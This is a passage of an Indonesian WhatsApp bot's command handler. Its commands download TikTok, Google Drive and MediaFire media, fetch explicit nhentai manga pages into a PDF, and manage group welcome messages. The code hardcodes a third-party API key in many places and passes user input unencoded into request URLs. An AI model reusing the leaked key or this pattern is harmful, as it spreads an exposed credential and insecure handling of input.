let anu = await fetchJson(`https://api.junn4.my.id/tools/tiktokstalk?username=${q}`)
const nick = anu.result.name
const username = anu.result.username
const foll = anu.result.followers
const foli = anu.result.following
const desk = anu.result.description
await juna.sendMessage(m.chat, { image: { url: anu.result.pp_user}, caption: `Name : ${nick}\nUsername : ${username}\nFollowers : ${foll}\nFollowing : ${foli}\nDescription : ${desk}`}, {quoted: m})
await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
}catch (error) {
newReply(`Error!\nPastikan username sama persis dan akun tidak di privat.`);
}
limitAdd(m.sender, limit)
}
break
case 'tiktoksearch': case 'tiktoks': case 'ttsearch':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} jj epep`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://skizo.tech/api/tiktok-search?apikey=chiwa&keywords=${text}`)
const capt = anu[0].title
juna.sendMessage(m.chat, { video: { url: anu[0].play}, caption: `🔖TITLE : ${capt}`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
}
break

case 'nhentaixxxx':
case 'kodenuklirxxxxx':
    if (isBan) return newReply('Lu mau ngapain cok');
    if (!isPremium && !isCreator) return newReply('Khusus Premium njenk akwowkwowow');
    if (!text) return newReply(`Masukkan command seperti berikut\nExample: .${command} 334756`);

    juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
    await sleep(2000);
    newReply('Prosess sayankk, jangan kebanyakan pmo yahh🥰🥰');
    await sleep(2000);
    newReply('yahahahaha error')
    await sleep(3000)
    newReply('tapi boonk wleee🤪🤪🤪')
    await sleep('2000')

    try {
        const nhentaiapi = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${text}?apikey=6b882dde90583a8ea51d4fcf`);

        if (!nhentaiapi || nhentaiapi.error) {
            await newReply('Gagal mengambil data manga dari nhentai.Kode tidak ditemukan atau kode yang kamu masukkan tidak valid');
            break;
        }

        if (!nhentaiapi.result.image || nhentaiapi.result.image.length === 0) {
            await newReply('Tidak ada gambar manga yang ditemukan.');
            break;
        }

        const fotonya = nhentaiapi.result.image[0];
        const judulnya = nhentaiapi.result.title_romaji;
        const ennya = nhentaiapi.result.title_native;
        const tagnya = nhentaiapi.result.tags.slice(0, 5);

        const halaman = [];
        for (let i = 1; i <= 26; i++) {
            if (nhentaiapi.result.image[i]) {
                halaman.push({url: nhentaiapi.result.image[i], caption: `Halaman ${i}`});
            }
        }

        await juna.sendMessage(m.chat, { image: {url: fotonya}, caption: `*Judul*\n${judulnya}\n\n*EN*\n${ennya}\n\n*Tags*\n${tagnya}\n\n*Download PDF*\nhttps://cin.mom/g/${text}\n\n*Baca Online*\nhttps://cin.mom/v/${text}`}, {quoted:fkontak});
        await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
        await newReply ('Bot sedang mengirim manga dalam bentuk foto, silakan tunggu');

        for (const hal of halaman) {
            try {
                await juna.sendMessage(m.chat, { image: {url: hal.url}, caption: hal.caption }, {quoted:fkontak});
                await sleep(3000);
            
            } catch (error) {
                console.error('Error saat mengirim foto:', error);
            }
        }
    } catch (error) {
        console.error('Error:', error);
        await newReply('Terjadi kesalahan saat memproses data manga.');
        await juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
    }
    newReply('Done Sayankk🥰🥰😋😋')

    break;

// break
// // const { PDFDocument, rgb } = require('pdf-lib');
// // const fetch = require('node-fetch');
// // const fs = require('fs');
// // const { PDFDocument } = require('pdf-lib');
// // const fs = require('fs');

// case 'nhentaipdf':
// case 'kodenuklirpdf':
//     if (isBan) {
//         return newReply('Lu mau ngapain cok');
//     }
//     if (!isPremium && !isCreator) {
//         return newReply('Khusus Premium njenk akwowkwowow');
//     }
//     if (!text) {
//         return newReply(`Masukkan command seperti berikut\nExample: .${command} 334756`);
//     }

//     juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
//     await sleep(2000);
//     await newReply('Prosess sayankk, jangan kebanyakan pmo yahh🥰🥰');
//     await sleep(2000);

//     try {
//         const nhentaiapi = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${text}?apikey=6b882dde90583a8ea51d4fcf`);

//         if (!nhentaiapi || nhentaiapi.error) {
//             return newReply('Gagal mengambil data manga dari nhentai. Kode tidak ditemukan atau kode yang kamu masukkan tidak valid');
//         }

//         if (!nhentaiapi.result.image || nhentaiapi.result.image.length === 0) {
//             return newReply('Tidak ada gambar manga yang ditemukan.');
//         }

//         const pdfPath = 'manga.pdf';
//         const pdfDoc = await PDFDocument.create();
//         const pages = pdfDoc.getPages();

//         const halaman = nhentaiapi.result.image.slice(0, 26); // Ambil 25 halaman pertama

//         for (let i = 0; i < halaman.length; i++) {
//             try {
//                 const imageBytes = await fetchImageData(halaman[i]);
//                 const image = await pdfDoc.embedJpg(imageBytes);
//                 const dimensions = image.scale(0.5);
//                 const page = pdfDoc.addPage([dimensions.width, dimensions.height]);
//                 page.drawImage(image, {
//                     x: 0,
//                     y: 0,
//                     width: dimensions.width,
//                     height: dimensions.height,
//                 });
//             } catch (error) {
//                 console.error('Error saat menambahkan gambar ke dalam PDF:', error);
//             }
//         }

//         const pdfBytes = await pdfDoc.save();

//         fs.writeFileSync(pdfPath, pdfBytes);
        
//         await juna.sendFile(m.chat, pdfPath, 'manga.pdf', `Prompt: ${text}`, m);
        
//         fs.unlinkSync(pdfPath); // Hapus file PDF setelah dikirim

//     } catch (error) {
//         console.error('Error:', error);
//         await newReply('Terjadi kesalahan saat memproses data manga.');
//         await juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
//     }
//     await newReply('Done Sayankk🥰🥰😋😋');
//     break;
break
// const { PDFDocument } = require('pdf-lib');
// const fetch = require('node-fetch');
// const fs = require('fs');

case 'nhentai':
case 'kodenuklir':
    if (isBan) {
        return newReply('Lu mau ngapain cok');
    }
    if (!isPremium && !isCreator) {
        return newReply('Khusus Premium njenk akwowkwowow');
    }
    if (!text) {
        return newReply(`Masukkan command seperti berikut\nExample: .${command} 334756`);
    }

    juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
    await sleep(2000);
    await newReply('Prosess sayankk, jangan kebanyakan pmo yahh🥰🥰');
    await sleep(2000);

    try {
        const nhentaiapi = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${text}?apikey=6b882dde90583a8ea51d4fcf`);
        const fotonya = nhentaiapi.result.image[0];
        const judulnya = nhentaiapi.result.title_romaji;
        const ennya = nhentaiapi.result.title_native;
        const tagnya = nhentaiapi.result.tags.slice(0, 5);
        await juna.sendMessage(m.chat, { image: {url: fotonya}, caption: `*Judul*\n${judulnya}\n\n*EN*\n${ennya}\n\n*Tags*\n${tagnya}\n\n*Download PDF*\nhttps://cin.mom/g/${text}\n\n*Baca Online*\nhttps://cin.mom/v/${text}`}, {quoted:fkontak});
        if (!nhentaiapi || nhentaiapi.error) {
            return newReply('Gagal mengambil data manga dari nhentai. Kode tidak ditemukan atau kode yang kamu masukkan tidak valid');
        }

        if (!nhentaiapi.result.image || nhentaiapi.result.image.length === 0) {
            return newReply('Tidak ada gambar manga yang ditemukan.');
        }

        const pdfPath = 'manga.pdf';
        const pdfDoc = await PDFDocument.create();
        const pages = pdfDoc.getPages();

        const halaman = nhentaiapi.result.image.slice(0, 60); // Ambil 25 halaman pertama

        for (let i = 0; i < halaman.length; i++) {
            try {
                const imageResponse = await fetch(halaman[i]);
                const imageBytes = await imageResponse.buffer();
                const image = await pdfDoc.embedJpg(imageBytes);
                const dimensions = image.scale(0.5);
                const page = pdfDoc.addPage([dimensions.width, dimensions.height]);
                page.drawImage(image, {
                    x: 0,
                    y: 0,
                    width: dimensions.width,
                    height: dimensions.height,
                });
            } catch (error) {
                console.error('Error saat menambahkan gambar ke dalam PDF:', error);
            }
        }

        const pdfBytes = await pdfDoc.save();

        fs.writeFileSync(pdfPath, pdfBytes);
        await sleep(3000)
        await newReply('Bot Sedang mengirim file dalam bentuk PDF,silahkan tunggu')
        await juna.sendFile(m.chat, pdfPath, `${text}.pdf`, `Prompt: ${text}`, m);
        
        fs.unlinkSync(pdfPath); // Hapus file PDF setelah dikirim

    } catch (error) {
        console.error('Error:', error);
        await newReply('Terjadi kesalahan saat memproses data manga.');
        await juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
    }
    await newReply('Done Sayankk🥰🥰😋😋');
    break;

break
// case 'nhentaipdf':
// case 'kodenuklirpdf':
//     if (isBan) {
//         return newReply('Lu mau ngapain cok');
//     }
//     if (!isPremium && !isCreator) {
//         return newReply('Khusus Premium njenk akwowkwowow');
//     }
//     if (!text) {
//         return newReply(`Masukkan command seperti berikut\nExample: .${command} 334756`);
//     }

//     juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

//     try {
//         const nhentaiapi = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${text}?apikey=6b882dde90583a8ea51d4fcf`);

//         if (!nhentaiapi || nhentaiapi.error) {
//             return newReply('Gagal mengambil data manga dari nhentai. Kode tidak ditemukan atau kode yang kamu masukkan tidak valid');
//         }

//         if (!nhentaiapi.result.image || nhentaiapi.result.image.length === 0) {
//             return newReply('Tidak ada gambar manga yang ditemukan.');
//         }

//         const imageUrls = nhentaiapi.result.image.slice(0, 26); // Ambil 25 URL gambar pertama

//         const pdfDoc = await PDFDocument.create();

//         for (let imageUrl of imageUrls) {
//             const imageResponse = await fetch(imageUrl);
//             const imageBuffer = await imageResponse.buffer();
//             const image = await pdfDoc.embedPng(imageBuffer);
//             const page = pdfDoc.addPage();
//             const { width, height } = image.scale(0.5);
//             page.drawImage(image, {
//                 x: 0,
//                 y: 0,
//                 width: width,
//                 height: height,
//                 opacity: 1,
//             });
//         }

//         const pdfBytes = await pdfDoc.save();

//         // Simpan file PDF
//         fs.writeFileSync('manga.pdf', pdfBytes);

//         // Kirim file PDF kepada pengguna
//         await juna.sendFile(m.chat, fs.readFileSync('manga.pdf'), 'manga.pdf', `Prompt: ${text}`, m);

//     } catch (error) {
//         console.error('Error:', error);
//         await newReply('Terjadi kesalahan saat memproses data manga.');
//         await juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
//     }
//     await newReply('Done Sayankk🥰🥰😋😋');
//     break;

break
// case 'nhentaipdf':
// case 'kodenuklirpdf':
//     if (isBan) {
//         return newReply('Lu mau ngapain cok');
//     }
//     if (!isPremium && !isCreator) {
//         return newReply('Khusus Premium njenk akwowkwowow');
//     }
//     if (!text) {
//         return newReply(`Masukkan command seperti berikut\nExample: .${command} 334756`);
//     }

//     juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
//     await sleep(2000);
//     newReply('Prosess sayankk, jangan kebanyakan pmo yahh🥰🥰');
//     await sleep(2000);
//     newReply('yahahahaha error')
//     await sleep(3000)
//     newReply('tapi boonk wleee🤪🤪🤪')
//     await sleep('2000')

//     try {
//         const nhentaiapi = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${text}?apikey=6b882dde90583a8ea51d4fcf`);

//         if (!nhentaiapi || nhentaiapi.error) {
//             await newReply('Gagal mengambil data manga dari nhentai. Kode tidak ditemukan atau kode yang kamu masukkan tidak valid');
//             break;
//         }

//         if (!nhentaiapi.result.image || nhentaiapi.result.image.length === 0) {
//             await newReply('Tidak ada gambar manga yang ditemukan.');
//             break;
//         }

//         // const PDFDocument = require('pdfkit');
//         // const fs = require('fs');
//         const pdfPath = 'manga.pdf';

//         const pdfDoc = new PDFDocument();
//         const stream = fs.createWriteStream(pdfPath);

//         pdfDoc.pipe(stream);

//         const halaman = nhentaiapi.result.image.slice(1, 27); // Ambil 26 halaman pertama

//         for (let i = 0; i < halaman.length; i++) {
//             try {
//                 const imageBytes = await fetchImageData(halaman[i]);
//                 const image = await pdfDoc.embedPng(imageBytes);
//                 const page = pdfDoc.addPage({ size: [image.width, image.height] });
//                 page.drawImage(image, {
//                     x: 0,
//                     y: 0,
//                     width: image.width,
//                     height: image.height,
//                 });
//             } catch (error) {
//                 console.error('Error saat menambahkan gambar ke dalam PDF:', error);
//             }
//         }

//         pdfDoc.end();

//         stream.on('finish', async () => {
//             // await juna.sendFile(m.chat, fs.readFileSync(pdfPath), 'manga.pdf', 'Berikut adalah manga dalam format PDF:', { quoted: fkontak });
//             await juna.sendFile(m.chat, fs.readFileSync(pdfPath), 'manga.pdf', `Prompt: ${text}`, m)
//             fs.unlinkSync(pdfPath); // Hapus file PDF setelah dikirim
//         });

//     } catch (error) {
//         console.error('Error:', error);
//         await newReply('Terjadi kesalahan saat memproses data manga.');
//         await juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
//     }
//     newReply('Done Sayankk🥰🥰😋😋')
//     break;
// break
// case 'nhentaipdf':
// case 'kodenuklirpdf':
//     if (isBan) {
//         return newReply('Lu mau ngapain cok');
//     }
//     if (!isPremium && !isCreator) {
//         return newReply('Khusus Premium njenk akwowkwowow');
//     }
//     if (!text) {
//         return newReply(`Masukkan command seperti berikut\nExample: .${command} 334756`);
//     }

//     juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

//     try {
//         const nhentaiapi = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${text}?apikey=6b882dde90583a8ea51d4fcf`);

//         if (!nhentaiapi || nhentaiapi.error) {
//             return newReply('Gagal mengambil data manga dari nhentai. Kode tidak ditemukan atau kode yang kamu masukkan tidak valid');
//         }

//         if (!nhentaiapi.result.image || nhentaiapi.result.image.length === 0) {
//             return newReply('Tidak ada gambar manga yang ditemukan.');
//         }

//         const imageUrls = nhentaiapi.result.image.slice(0, 26); // Ambil 25 URL gambar pertama
//         const imgtopdfUrl = 'https://api.lolhuman.xyz/api/convert/imgtopdf?apikey=6b882dde90583a8ea51d4fcf';

//         // Mengirimkan array URL gambar ke API imgtopdf
//         const pdfResponse = await fetch(imgtopdfUrl, {
//             method: 'POST',
//             headers: {
//                 'Content-Type': 'application/json'
//             },
//             body: JSON.stringify({ img: imageUrls })
//         });

//         if (!pdfResponse.ok) {
//             return newReply('Gagal mengonversi gambar ke PDF.');
//         }

//         const pdfData = await pdfResponse.buffer();

//         // Mengirimkan file PDF yang dihasilkan ke pengguna
//         await juna.sendFile(m.chat, pdfData, 'manga.pdf', `Prompt: ${text}`, m);

//     } catch (error) {
//         console.error('Error:', error);
//         await newReply('Terjadi kesalahan saat memproses data manga.');
//         await juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
//     }
//     await newReply('Done Sayankk🥰🥰😋😋');
//     break;

// break
// case 'nhentaipdf2':
// case 'kodenuklirpdf2':
//     if (isBan) {
//         return newReply('Lu mau ngapain cok');
//     }
//     if (!isPremium && !isCreator) {
//         return newReply('Khusus Premium njenk akwowkwowow');
//     }
//     if (!text) {
//         return newReply(`Masukkan command seperti berikut\nExample: .${command} 334756`);
//     }

//     juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
//     await sleep(2000);
//     await newReply('Prosess sayankk, jangan kebanyakan pmo yahh🥰🥰');
//     await sleep(2000);

//     try {
//         const nhentaiapi = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${text}?apikey=6b882dde90583a8ea51d4fcf`);

//         if (!nhentaiapi || nhentaiapi.error) {
//             return newReply('Gagal mengambil data manga dari nhentai. Kode tidak ditemukan atau kode yang kamu masukkan tidak valid');
//         }

//         if (!nhentaiapi.result.image || nhentaiapi.result.image.length === 0) {
//             return newReply('Tidak ada gambar manga yang ditemukan.');
//         }

//         const pdfPath = 'manga.pdf';
//         const pdfDoc = new PDFDocument();
//         const stream = fs.createWriteStream(pdfPath);

//         pdfDoc.pipe(stream);

//         const halaman = nhentaiapi.result.image.slice(0, 26); // Ambil 25 halaman pertama

//         for (let i = 0; i < halaman.length; i++) {
//             try {
//                 const imageBytes = await fetchImageData(halaman[i]);
//                 const image = await pdfDoc.embedPng(imageBytes);
//                 const page = pdfDoc.addPage({ size: [image.width, image.height] });
//                 page.drawImage(image, {
//                     x: 0,
//                     y: 0,
//                     width: image.width,
//                     height: image.height,
//                 });
//             } catch (error) {
//                 console.error('Error saat menambahkan gambar ke dalam PDF:', error);
//             }
//         }

//         pdfDoc.end();

//         stream.on('finish', async () => {
//             await juna.sendFile(m.chat, pdfPath, 'manga.pdf', `Prompt: ${text}`, m);
//             fs.unlinkSync(pdfPath); // Hapus file PDF setelah dikirim
//         });

//     } catch (error) {
//         console.error('Error:', error);
//         await newReply('Terjadi kesalahan saat memproses data manga.');
//         await juna.sendMessage(m.chat, { react: { text: `❌`, key: m.key }});
//     }
//     await newReply('Done Sayankk🥰🥰😋😋');
//     break;
// break
case 'ttslide': case 'tiktokslide':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
newReply(mess.wait)
let ban = m.mentionedJid[0] || m.sender || conn.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
try{
let anu = await fetchJson(`https://api.yanzbotz.my.id/api/downloader/tiktok?url=${text}`)
for (let slide of anu.result.image) {
await sleep(1500)
await juna.sendFile(ban, slide, null, ``, m)
}
await juna.sendMessage(ban, {text: `Username : ${anu.result.username}\nvDeskripsi : ${anu.result.description}`}, {quoted: m})
return juna.sendMessage(m.chat, {text: `Done?`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download\n\nRequest failed with status code *404*`);
}
}
limitAdd(m.sender, limit)
break
case'tt': case 'ttnowm': case 'tiktokwm': case 'tiktoknowm': case 'tiktok':{
if (!isPremium) return newReply('Khusus Premium')
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://api.lolhuman.xyz/api/tiktok2?apikey=6b882dde90583a8ea51d4fcf&url=${text}`)
juna.sendMessage(m.chat, { video: { url: anu.result}, caption: `Done.`}, {quoted: m})
await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
}catch (error) {
await juna.sendMessage(m.chat, { react: { text: `❎`, key: m.key }})
}
limitAdd(m.sender, limit)
}
break
case 'tiktokmp3': case 'ttmp3': case 'tiktokaudio':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${text}`)
const aud = anu.result[0].mp3
juna.sendMessage(m.chat, {audio : {url : aud}, mimetype:'audio/mpeg'}, {quoted:m})
}
limitAdd(m.sender, limit)
break
case 'gddl': case 'gdrivedl': case 'gdrive':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
const {
					sizeFormatter
				} = await import('human-readable')
				let formatSize = sizeFormatter({
					std: 'JEDEC',
					decimalPlaces: 2,
					keepTrailingZeroes: false,
					render: (literal, symbol) => `${literal} ${symbol}B`
				})
				async function GDriveDl(url) {
					let id
					if (!(url && url.match(/drive\.google/i))) return newReply('Invalid URL')
					id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))[1]
					if (!id) return newReply('ID Not Found')
					let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
						method: 'post',
						headers: {
							'accept-encoding': 'gzip, deflate, br',
							'content-length': 0,
							'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
							'origin': 'https://drive.google.com',
							'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
							'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
							'x-drive-first-party': 'DriveWebUi',
							'x-json-requested': 'true'
						}
					})
					let {
						fileName,
						sizeBytes,
						downloadUrl
					} = JSON.parse((await res.text()).slice(4))
					if (!downloadUrl) return newReply('Link Download Limit!')
					let data = await fetch(downloadUrl)
					if (data.status !== 200) throw data.statusText
					return {
						downloadUrl,
						fileName,
						fileSize: formatSize(sizeBytes),
						mimetype: data.headers.get('content-type')
					}
				}
				newReply(mess.wait)
				await sleep(500)
				if (!text) return invalid(precom + ' https://drive.google.com/72jshshehk')
				GDriveDl(args[0]).then(async (res) => {
					if (!res) throw res
					await newReply(JSON.stringify(res, null, 2))
					juna.sendMessage(m.chat, {
						document: {
							url: res.downloadUrl
						},
						fileName: res.fileName,
						mimetype: res.mimetype,
						contextInfo:
						{
							"externalAdReply": {
								"title": botName,
								"body": `${ucapanWaktu}`,
								previewType: "PHOTO",
								showAdAttribution: true,
								sourceUrl: '',
								thumbnailUrl: pathimg
							}
						}
					}, {
						quoted: m
					})
				})
}
break
case'mediafire': case'mfire': case'mfdl':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix} limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*`)
if (!isUrl(text)) return newReply(mess.error.Iv)
if (!text.includes('mediafire.com')) return newReply(mess.error.Iv)
newReply(mess.wait)
addCountCmd('#mediafire', m.sender, _cmd)
kotz.mediafire(text).then(async(data) => {
data = data[0]
data.nama = decodeURIComponent(data.nama)
var media = await getBuffer(data.link)
if (data.mime.includes('mp4')) {
juna.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'video/mp4' }, { quoted: m })
} else if (data.mime.includes('mp3')) {
juna.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'audio/mp3' }, { quoted: m })
} else {
juna.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'application/'+data.mime }, { quoted: m })
}
}).catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
newReply(mess.error.api)
})}
limitAdd(m.sender, limit)
break
case 'gitclone':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
let regx = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://github.com/juun4/JunaBot-MdV1.1`)
if (!regx.test(text)) return newReply('Linknya salah')
newReply(mess.wait)
let [, usr, repo] = text.match(regx) || []
let repos = repo.replace(/.git$/, '')
let hasdl = `https://api.github.com/repos/${usr}/${repos}/zipball`
let namafile = (await fetch(hasdl, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
juna.sendMessage(m.chat, { document: { url: hasdl }, mimetype: 'application/zip', fileName: namafile }, { quoted: m })
}
limitAdd(m.sender, limit)
break

// Group Menu
case'afk':
if (isBan) return newReply('Lu di ban kocak awokwok') 

if (isAfkOn) return newReply('Afk sudah diaktifkan sebelumnya')
addCountCmd('#afk', m.sender, _cmd)
let reason = text ? text : 'Nothing.'
afk.addAfkUser(m.sender, Date.now(), reason, _afk)
juna.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} sedang afk\nAlasan : ${reason}`, m)
break
case'welcome':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#welcome', m.sender, _cmd)
if (isWelcome) return newReply(`Udah on`)
_welcome.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
newReply('Sukses mengaktifkan welcome di grup ini')
} else if (args[0] === "off") {
addCountCmd('#welcome', m.sender, _cmd)
if (!isWelcome) return newReply(`Udah off`)
let anu = _welcome.indexOf(m.chat)
_welcome.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
newReply('Sukses menonaktifkan welcome di grup ini')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case'left': case 'goodbye':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#left', m.sender, _cmd)
if (isLeft) return newReply(`Udah on`)
_left.push(m.chat)
fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
newReply('Sukses mengaktifkan goodbye di grup ini')
} else if (args[0] === "off") {
addCountCmd('#left', m.sender, _cmd)
if (!isLeft) return newReply(`Udah off`)
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
newReply('Sukses menonaktifkan goodbye di grup ini')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
break
case'setwelcome':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) return newReply(`Set welcome already active`)
addSetWelcome(text, m.chat, set_welcome_db)
addCountCmd('#setwelcome', m.sender, _cmd)
newReply(`Successfully set welcome!`)
break
case'changewelcome':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks_welcome*\n\n_Contoh_\n\n${prefix+command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) {
addCountCmd('#changewelcome', m.sender, _cmd)
changeSetWelcome(q, m.chat, set_welcome_db)
newReply(`Sukses change set welcome teks!`)
} else {
addCountCmd('#changewelcome', m.sender, _cmd)
addSetWelcome(q, m.chat, set_welcome_db)
newReply(`Sukses change set welcome teks!`)
}
break
case'delsetwelcome':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!isSetWelcome(m.chat, set_welcome_db)) return newReply(`Belum ada set welcome di sini..`)
removeSetWelcome(m.chat, set_welcome_db)
addCountCmd('#delsetwelcome', m.sender, _cmd)
newReply(`Sukses delete set welcome`)
break
case'setleft':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) return newReply(`Set left already active`)
addCountCmd('#setleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
newReply(`Successfully set left!`)
break
case'changeleft':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) {
addCountCmd('#changeleft', m.sender, _cmd)
changeSetLeft(q, m.chat, set_left_db)
newReply(`Sukses change set left teks!`)
} else {
addCountCmd('#changeleft', m.sender, _cmd)
addSetLeft(q, m.chat, set_left_db)
newReply(`Sukses change set left teks!`)
}
break
case'delsetleft':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus owner!')
if (!isSetLeft(m.chat, set_left_db)) return newReply(`Belum ada set left di sini..`)
addCountCmd('#delsetleft', m.sender, _cmd)
removeSetLeft(m.chat, set_left_db)
newReply(`Sukses delete set left`)
break
case 'linkgrup': case 'linkgroup': case 'linkgc': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let response = await juna.groupInviteCode(m.chat)
juna.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'pppanjang': case 'setppbot2':{
